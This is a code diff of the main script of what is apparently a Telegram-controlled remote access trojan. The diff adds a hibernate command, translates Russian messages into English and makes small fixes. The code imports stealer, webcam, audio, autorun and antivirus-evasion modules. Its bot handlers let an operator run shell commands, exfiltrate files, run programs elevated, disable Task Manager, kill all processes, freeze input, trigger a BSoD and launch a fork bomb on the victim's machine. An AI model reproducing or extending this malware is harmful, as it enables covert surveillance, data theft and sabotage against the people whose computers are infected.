@@ -1,5 +1,45 @@
-from Imports import *
+import re
+import os
+import sys
+import glob
+import time
+import shutil
+import telebot
+import requests
+import platform
+import subprocess
+import urllib.request
+from subprocess import Popen, PIPE
+
 from RAT import *
+
+from Core.Settings.Antibot import *
+from Core.Settings.Antivirus import *
+from Core.Settings.Config import *
+
+from Core.Main.Screen import *
+from Core.Main.Webcam import *
+from Core.Main.Audio import *
+from Core.Main.Power import *
+from Core.Main.Autorun import *
+
+from Core.Files.Tasklist import *
+from Core.Files.Taskkill import *
+
+from Core.Fun.Message import *
+from Core.Fun.Speak import *
+from Core.Fun.OpenURL import *
+from Core.Fun.Wallpapers import *
+from Core.Fun.ForkBomb import *
+
+from Core.Stealer.Stealer import *
+
+from Core.Misc.Clipboard import *
+from Core.Misc.Freeze import *
+
+from telebot import types
+from telebot import util
+from telebot import apihelper
 
 bot = telebot.TeleBot(TelegramToken, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=50)
@@ -18,16 +58,18 @@ menu.row(button4, button5, button6)
 menu.row(button7, button8)
 
 main2 = types.InlineKeyboardMarkup()
-button1 = types.InlineKeyboardButton('Shutdown - ⛔️', callback_data='shutdown')
-button2 = types.InlineKeyboardButton('Restart - ⭕️', callback_data='restart')
-button3 = types.InlineKeyboardButton('Logoff - 💢', callback_data='logoff')
-button4 = types.InlineKeyboardButton('BSoD - 🌀', callback_data='bsod')
-button5 = types.InlineKeyboardButton('« Back', callback_data='cancel')
+button1 = types.InlineKeyboardButton('Hibernate - 🛑', callback_data='hibernate')
+button2 = types.InlineKeyboardButton('Shutdown - ⛔️', callback_data='shutdown')
+button3 = types.InlineKeyboardButton('Restart - ⭕️', callback_data='restart')
+button4 = types.InlineKeyboardButton('Logoff - 💢', callback_data='logoff')
+button5 = types.InlineKeyboardButton('BSoD - 🌀', callback_data='bsod')
+button6 = types.InlineKeyboardButton('« Back', callback_data='cancel')
 main2.row(button1)
 main2.row(button2)
 main2.row(button3)
 main2.row(button4)
 main2.row(button5)
+main2.row(button6)
 
 main3 = types.InlineKeyboardMarkup()
 button1 = types.InlineKeyboardButton('Add to Startup - 📥', callback_data='startup')
@@ -187,7 +229,7 @@ if DisplayMessageBox is True:
    pass
   else:
    open(Temp+'MessageBox', 'a').close()
-   MessageBox(Message)
+   MessageBox(MessageTitle, Message)
  except:
   pass
 
@@ -296,7 +338,7 @@ def Video(command):
    Video = open(File, 'rb')
    bot.send_animation(command.chat.id, Video)
   except ValueError:
-   bot.send_message(command.chat.id, '*Value Error*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
   except:
    bot.send_message(command.chat.id, '*Webcam not found!*', parse_mode="Markdown")
  except:
@@ -317,7 +359,7 @@ def Audio(command):
    Audio = open(File, 'rb')
    bot.send_voice(command.chat.id, Audio)
   except ValueError:
-   bot.send_message(command.chat.id, '*Value Error*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
   except:
    bot.send_message(command.chat.id, '*Failed to record audio!*', parse_mode="Markdown")
  except:
@@ -329,9 +371,17 @@ def Audio(command):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_inline(command):
  if command.message:
+  if command.data == 'hibernate':
+   try:
+    SendMessage(command, '*Hibernate* command received!')
+    Hibernate()
+   except:
+    pass
+
+
   if command.data == 'shutdown':
    try:
-    SendMessage(command, '*Shutdown command received!*')
+    SendMessage(command, '*Shutdown* command received!')
     Shutdown()
    except:
     pass
@@ -339,7 +389,7 @@ def callback_inline(command):
 
   if command.data == 'restart':
    try:
-    SendMessage(command, '*Restart command received!*')
+    SendMessage(command, '*Restart* command received!')
     Restart()
    except:
     pass
@@ -347,7 +397,7 @@ def callback_inline(command):
 
   if command.data == 'logoff':
    try:
-    SendMessage(command, '*Logoff command received!*')
+    SendMessage(command, '*Logoff* command received!')
     Logoff()
    except:
     pass
@@ -355,7 +405,7 @@ def callback_inline(command):
 
   if command.data == 'bsod':
    try:
-    SendMessage(command, '*The blue screen of death is activated!*')
+    SendMessage(command, 'The *Blue Screen of Death* is activated!')
     BSoD()
    except:
     pass
@@ -379,7 +429,7 @@ def callback_inline(command):
 
   if command.data == 'confirm':
    try:
-    SendMessage(command, '*'+CurrentName+'* deleted!')
+    SendMessage(command, '*'+CurrentName+'* uninstalled!')
     Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Temp, ProgramData)
    except:
     SendMessage(command, '*Error*')
@@ -387,7 +437,7 @@ def callback_inline(command):
 
   if command.data == 'taskkill all':
    try:
-    TaskkillAll(Temp)
+    TaskkillAll(CurrentName, Temp)
     SendMessage(command, '*All processes are stopped!*')
    except:
     pass
@@ -396,11 +446,11 @@ def callback_inline(command):
   if command.data == 'disabletaskmgr':
    try:
     if os.path.exists(ProgramData+'DisableTaskManager.bat'):
-      SendMessage(command, '*Task Manager is already disabled!*')
+      SendMessage(command, '*Task Manager* is already disabled!')
     else:
      RegeditDisableTaskManager(ProgramData)
      WhileRunAS(ProgramData+'DisableTaskManager.bat')
-     SendMessage(command, '*Task Manager disabled!*')
+     SendMessage(command, '*Task Manager* disabled!')
    except:
     pass
 
@@ -463,7 +513,7 @@ def Remove(command):
           file_info = os.stat(file_path)
           return convert_bytes(file_info.st_size)
   bot.send_message(command.chat.id, 
-    'File *'+msg+'* removed!' 
+    'File *'+File+'* removed!' 
     '\n' 
     '\nCreated » %02d/%02d/%d'%(day,month,year)+
     '\nSize » '+file_size(os.getcwd()+'\\'+File),
@@ -504,7 +554,7 @@ def Remove(command):
 @bot.message_handler(commands=['RemoveAll', 'removeall'])
 def RemoveAll(command):
  try:
-  bot.send_message(command.chat.id, '*Removing...*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Removing files...*', parse_mode="Markdown")
   folder = os.getcwd()
   folder_size = 0
   for (path, dirs, files) in os.walk(folder):
@@ -550,7 +600,7 @@ def Upload(command):
   urllib.request.urlretrieve(File, file_name)
   bot.reply_to(command, '*File uploaded to computer!*\n\n`'+file_name+'`', parse_mode="Markdown")
  except ValueError:
-  bot.send_message(command.chat.id, '*Value Error*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Send file or paste link\n\n› /Upload*', parse_mode="Markdown")
 
@@ -561,12 +611,12 @@ def Upload(command):
 def Document(command):
  try:
   File = bot.get_file(command.document.file_id)
-  bot.send_message(command.chat.id, '*Загружаем...*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Uploading file...*', parse_mode="Markdown")
   downloaded_file = bot.download_file(File.file_path)
   src = ProgramData+'Files\\'+File.file_path;
   with open(src, 'wb') as new_file:
    new_file.write(downloaded_file)
-  bot.reply_to(command, '*File uploaded to computer!*\n\n`C:/ProgramData/Files/'+File.file_path+'`', parse_mode="Markdown")
+  bot.reply_to(command, '*File uploaded to computer!*\n\n`'+ProgramData+'Files/'+File.file_path+'`', parse_mode="Markdown")
  except FileNotFoundError:
   bot.reply_to(command, '*File format not supported!*', parse_mode="Markdown")
  except:
@@ -580,8 +630,7 @@ def download(command):
  try:
   File = re.split('/Download ', command.text, flags=re.I)[1]
   download = open(os.getcwd()+'\\'+File, 'rb')
-  bot.send_message(command.chat.id, '*Sending...*', parse_mode="Markdown")
-  bot.send_chat_action(command.chat.id, 'upload_document')
+  bot.send_message(command.chat.id, '*Sending file...*', parse_mode="Markdown")
   bot.send_document(command.chat.id, download)
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*File not found!*', parse_mode="Markdown")
@@ -593,9 +642,8 @@ def download(command):
                            'zip',
                            os.getcwd()+'\\',
                            File)
-   bot.send_chat_action(command.chat.id, 'upload_document')
    file = open(ProgramData+msg+'.zip', 'rb')
-   bot.send_message(command.chat.id, '*Sending...*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*Sending folder...*', parse_mode="Markdown")
    bot.send_document(command.chat.id, file)
    file.close()
    os.remove(ProgramData+File+'.zip')
@@ -632,10 +680,12 @@ def RunAS(command):
  try:
   File = re.split('/RunAS ', command.text, flags=re.I)[1]
   bot.send_chat_action(command.chat.id, 'typing')
-  WhileRunAS(os.getcwd()+'\\'+File)
+  os.startfile(os.getcwd()+'\\'+File, 'runas')
   bot.send_message(command.chat.id, 'File *'+File+'* is running!', parse_mode="Markdown")
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*File not found!*', parse_mode="Markdown")
+ except OSError:
+  bot.send_message(command.chat.id, '*Acces denied!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Enter a file name\n\n› /Run • /RunAS*', parse_mode="Markdown")
 
@@ -660,7 +710,7 @@ def Taskkill(command):
   Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
   bot.send_chat_action(command.chat.id, 'typing')
   KillProcess(Process)
-  bot.send_message(command.chat.id, 'Process *'+Process+".exe* stopped!", parse_mode="Markdown")
+  bot.send_message(command.chat.id, 'Process *'+Process+'.exe* stopped!', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, 
   '*Enter process name'
@@ -680,7 +730,7 @@ def Message(command):
  try:
   Message = re.split('/Message ', command.text, flags=re.I)[1]
   bot.send_chat_action(command.chat.id, 'typing')
-  bot.reply_to(command, '*Message sent!*', parse_mode="Markdown")
+  bot.reply_to(command, '*The Message is Sent!*', parse_mode="Markdown")
   SendMessageBox(Message)
  except:
   bot.send_message(command.chat.id, '*Enter your message\n\n› /Message*', parse_mode="Markdown")
@@ -694,7 +744,7 @@ def OpenURL(command):
   URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
   bot.send_chat_action(command.chat.id, 'typing')
   OpenBrowser(URL)
-  bot.reply_to(command, '*URL is open!*', parse_mode="Markdown")
+  bot.reply_to(command, '*The URL is Open!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Enter URL\n\n› /OpenURL*', parse_mode="Markdown")
 
@@ -707,7 +757,7 @@ def Wallpapers(command):
   Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
   GetPhoto(Photo, command)
   SetWallpapers(Photo, ProgramData)
-  bot.reply_to(command, '*The photo is set on the wallpapers!*', parse_mode="Markdown")
+  bot.reply_to(command, '*The Photo is Set on the Wallpapers!*', parse_mode="Markdown")
  except:
   pass
 
@@ -732,7 +782,7 @@ def Speak(command):
 
 @bot.message_handler(regexp='/ForkBomb')
 def Forkbomb(command):
- bot.send_message(command.chat.id, '*ForkBomb Activated!*', parse_mode="Markdown")
+ bot.send_message(command.chat.id, '*The ForkBomb is Activated!*', parse_mode="Markdown")
  ForkBomb()
 
 
@@ -810,7 +860,9 @@ def Freeze(command):
    Block(float(Seconds))
    bot.send_message(command.chat.id, '*Keyboard and mouse are now unlocked!*', parse_mode="Markdown")
   except ValueError:
-   bot.send_message(command.chat.id, '*Value Error*', parse_mode="Markdown")
+   bot.send_message(command.chat.id, '*ValueError*', parse_mode="Markdown")
+  except OverflowError:
+   bot.send_message(command.chat.id, '*OverflowError*', parse_mode="Markdown")
   except:
    bot.send_message(command.chat.id, '*Specify the duration of the lock\n\n› /Freeze*', parse_mode="Markdown")
 
@@ -828,10 +880,15 @@ def CMD(command):
       line = line.strip()
       if line:
           lines.append(line.decode('cp866'))
-  bot.send_message(command.chat.id, ('\n'.join(lines)))
+          Output = '\n'.join(lines)
+  bot.send_message(command.chat.id, Output)
  except:
-  bot.send_message(command.chat.id, '*Enter command\n\n› /CMD*', parse_mode="Markdown")
-
+  try:
+   splitted_text = util.split_string(Output, 4096)
+   for Output in splitted_text:
+    bot.send_message(command.chat.id, Output)
+  except:
+   bot.send_message(command.chat.id, '*Enter command\n\n› /CMD*', parse_mode="Markdown")
 
 # Navigation buttons
 
@@ -870,7 +927,7 @@ def Wallpapers(command):
 @bot.message_handler(commands=['Help', 'help'])
 def Help(command):
  bot.send_message(command.chat.id,
-  'ᅠᅠᅠᅠ  ⚙️ *Команды* ⚙️'
+  'ᅠᅠᅠᅠ ⚙️ *Commands* ⚙️'
   '\n'
   '\n'
   '\n*/Screen* -  Desktop Capture'
